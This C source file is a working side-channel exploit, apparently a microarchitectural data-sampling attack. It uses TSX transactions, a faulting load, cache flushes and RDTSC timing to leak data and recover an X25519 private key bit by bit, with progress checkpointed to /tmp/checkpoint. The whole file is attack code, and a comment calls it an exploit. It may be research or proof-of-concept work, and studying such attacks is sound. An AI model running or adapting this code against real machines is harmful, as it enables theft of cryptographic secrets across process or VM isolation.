#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <memory.h>
#include <sys/mman.h>
#include <immintrin.h>
#include <err.h>
#include <stdint.h>
#include <unistd.h>
#include <syscall.h>
#include <linux/mman.h>



#define MEMSZ (256*512 * 100)

#define CACHE_MISS 100

static inline __attribute__((always_inline)) int is_cached(void *ptr1) {
  uint32_t diff;
  asm volatile (
      //"cpuid\n\t"
      "mfence\n\t"
      "lfence\n\t"
      "RDTSC\n\t"
      "mov rbx, rax\n\t"
      "mov rdx, [%1]\n\t"
      "RDTSCP\n\t"
      "lfence\n\t"
      "sub rax, rbx\n\t"
      "mov %0, eax\n\t"

      : "=b" (diff)
      : "S"(ptr1)
      : "rax", "rcx", "rdx");

  return diff < CACHE_MISS;
}

const unsigned long probe1_addr = 0x7895e4000;
char *probe1 = (char*) probe1_addr;
const unsigned long probe3_addr = 0x560000000;
char *probe3 = (char*) probe3_addr;


static int mlpds(unsigned long prefix) {
  prefix ^= probe1_addr;
  _mm_clflush(probe1);
  _mm_mfence();
  _mm_sfence();
  _mm_lfence();
  asm volatile("CPUID"::: "eax","ebx","ecx","edx", "memory");


  // TODO find optimal number of iterations.
  for (int i = 0; i < 32; i++) {
  asm volatile(
      ".align 64\n\t"
      "0:\n\t"
      "clflush [%0]\n\t"
      "sfence\n\t"
      // idk why, helps speed up
      "xbegin 2f\n\t"

      //xbegin block:
      "mov   rax, [-1]\n\t"
      "xor   rax, %1\n\t"
      "prefetchnta [rax]\n"

      "xend\n\t"
      "nop\nnop\nnop\nnop\nnop\n"
      "nop\nnop\nnop\nnop\nnop\n"
      "nop\nnop\nnop\nnop\nnop\n"
      "nop\nnop\nnop\nnop\nnop\n"
      "nop\nnop\nnop\nnop\nnop\n"

      "nop\nnop\nnop\nnop\nnop\n"
      "nop\nnop\nnop\nnop\nnop\n"
      "nop\nnop\nnop\nnop\nnop\n"
      "nop\nnop\nnop\nnop\nnop\n"
      "nop\nnop\nnop\nnop\nnop\n"

      "nop\nnop\nnop\nnop\nnop\n"
      "nop\nnop\nnop\nnop\nnop\n"
      "nop\nnop\nnop\nnop\nnop\n"
      "nop\nnop\nnop\nnop\nnop\n"
      "nop\nnop\nnop\nnop\nnop\n"

      "nop\nnop\nnop\nnop\nnop\n"
      "nop\nnop\nnop\nnop\nnop\n"
      "nop\nnop\nnop\nnop\nnop\n"
      "nop\nnop\nnop\nnop\nnop\n"
      "nop\nnop\nnop\nnop\nnop\n"
      "3: jmp 3b\n"
      "2:\n\t"
      //"dec r15\n\t"
      //"jne 0b\n\t"
      :
      : "r" (probe3), "r"(prefix)
      : "rax");
  }

  int p1 = is_cached(probe1);
  if (p1) { return 0; }
  return -1;
}


void map() {
  if (mmap(probe1, 4096, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE, -1, 0) != probe1) {
    err(1, "mmap(probe1)");
  }
  memset(probe1, 0x99, 4096);
  if (mmap(probe3, 4096, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE, -1, 0) != probe3) {
    err(1, "mmap(probe3)");
  }
  memset(probe3, 0x99, 4096);
}

void print_secret(unsigned char* secret) {
  printf("Secret:");
  for (int i = 0; i < 32; i++) {
    printf(" %02x", secret[i]);
  }
  printf("\n");
}

void set_bit(uint8_t* privkey, int bit, int to) {
  if (bit < 0) return;
  privkey[bit / 8] &= ~(1 << (bit & 7));
  privkey[bit / 8] |= to << (bit & 7);
}

int X25519_fake(uint8_t* out, const uint8_t* privkey,
                const uint8_t* peer_pubkey, int iteration);

void X25519_public_from_private(uint8_t out_public_value[32],
                                const uint8_t private_key[32]);

void stage3(size_t secret_offset, size_t saved_rbp) {
  uint8_t pubkey[32];
  uint8_t client_privkey[32];
  printf("Input client private key:\n");
  for (int i = 0; i < 32; i++) {
    unsigned int n;
    scanf("%x", &n);
    client_privkey[i] = n;
  }
  X25519_public_from_private(pubkey, client_privkey);
  for (int i = 0; i < 32; i++) {
    printf("%02x ", client_privkey[i]);
  }
  printf("\n");
  for (int i = 0; i < 32; i++) {
    printf("%02x ", pubkey[i]);
  }
  printf("\n");
  uint8_t privkey[32] = {0};
  privkey[31] &= 127;
  privkey[31] |= 64;
  uint8_t out[40];
  // The algorithm starts at that iteration.
  int start_iteration = 253;

  // Check if checkpoint available.
  FILE* f = fopen("/tmp/checkpoint", "r");
  if (!f) {
    printf("Starting from scratch.\n");
  }
  else {
    printf("Starting from checkpoint.\n");
    fscanf(f, "%d", &start_iteration);
    for (int i = 0; i < 32; i++) {
      unsigned int n;
      fscanf(f, "%x", &n);
      privkey[i] = n;
    }
    fclose(f);
  }

  print_secret(privkey);

#define MARGIN 3

  // Ending on iteration 3, since bits 2, 1 and 0 are unset.
  for (int iteration = start_iteration; iteration >= 3; iteration--) {
    unsigned short results[4][5] = {0};
    size_t poss[4][5] = {};

    // iteration - 2 if you want to look at two bits.
    // iteration - 1 if you want to look at one bit.
    int x_it = iteration - 1;
    if (x_it < 0) x_it = 0;

    for (int which_qword = 0; which_qword < 5; which_qword++) {
      set_bit(privkey, iteration, 0);
      set_bit(privkey, iteration-1, 0);
      X25519_fake(out, privkey, pubkey, x_it);
      poss[0][which_qword] = ((size_t*)out)[which_qword];

      set_bit(privkey, iteration, 0);
      set_bit(privkey, iteration-1, 1);
      X25519_fake(out, privkey, pubkey, x_it);
      poss[1][which_qword] = ((size_t*)out)[which_qword];

      set_bit(privkey, iteration, 1);
      set_bit(privkey, iteration-1, 0);
      X25519_fake(out, privkey, pubkey, x_it);
      poss[2][which_qword] = ((size_t*)out)[which_qword];

      set_bit(privkey, iteration, 1);
      set_bit(privkey, iteration-1, 1);
      X25519_fake(out, privkey, pubkey, x_it);
      poss[3][which_qword] = ((size_t*)out)[which_qword];
    }

    printf("iter=%d\nTargets:\n", iteration);
    for (int i = 0; i < 5; i++) {
      for (int j = 0; j < 4; j++) {
        printf("%016llx ", poss[j][i]);
      }
      printf("\n");
    }
    int diff_abs;
    int bit;
    do {
      for (int times = 0; times < 20000; times++) {
        for (int k = 0; k < 4; k++) {
          for (int wq = 0; wq < 5; wq++) {
            int byte = mlpds(poss[k][wq]);
            if (byte != -1) {
              // Oddly enough, this printf is sometimes necessary... Otherwise exploit
              // occasionally breaks.
              //printf("res: %d\n", byte);
              results[k][wq]++;
            }
          }
        }
      }
      //diff = 0;
      //int plus = 0;
      //int minus = 0;
      int sums[4] = {0};
      for (int wq = 0; wq < 5; wq++) {
        for (int ij = 0; ij < 4; ij++) {
          sums[ij] += results[ij][wq];
        }
        //diff += results[0][wq] + results[1][wq] - results[2][wq] - results[3][wq];
        //plus += results[0][wq] + results[1][wq];
        //minus += results[2][wq] + results[3][wq];
        printf("%d %d | %d %d\n", results[0][wq], results[1][wq], results[2][wq], results[3][wq]);
      }

#if 1
      //version for iteration - 1
      int x0 = sums[0] + sums[1];
      int x1 = sums[2] + sums[3];
      diff_abs = x0 - x1;
      if (diff_abs < 0) diff_abs = -diff_abs;
      bit = x1 > x0;
      printf("--- diff_abs %d (%d vs. %d, total %d)\n", diff_abs, x0, x1, x0+x1);
#else
      //version for iteration - 2
      int top = -1, topind = -1, top2 = -1, top2ind = -1;
      for (int ij = 0; ij < 4; ij++) {
        if (sums[ij] > top) {
          top2 = top;
          top2ind = topind;
          top = sums[ij];
          topind = ij;
        }
        else if (sums[ij] > top2) {
          top2 = sums[ij];
          top2ind = ij;
        }
      }
      diff_abs = top - top2;
      bit = topind >= 2;
      printf("--- diff_abs %d (top1 %d vs. top2 %d vs. total %d)\n", diff_abs, top, top2, sums[0]+sums[1]+sums[2]+sums[3]);
#endif
    } while (diff_abs < MARGIN);
    set_bit(privkey, iteration-1, 0);
    set_bit(privkey, iteration, bit);
    /*
    if (diff < 0) {
      set_bit(privkey, iteration, 1);
    }
    else {
      set_bit(privkey, iteration, 0);
    }
    */
    print_secret(privkey);
  }
  privkey[0] &= 248;
  print_secret(privkey);
}

void run() {
  map();

  stage3(0, 0);
}

int main() {
  run();

  return 0;
}

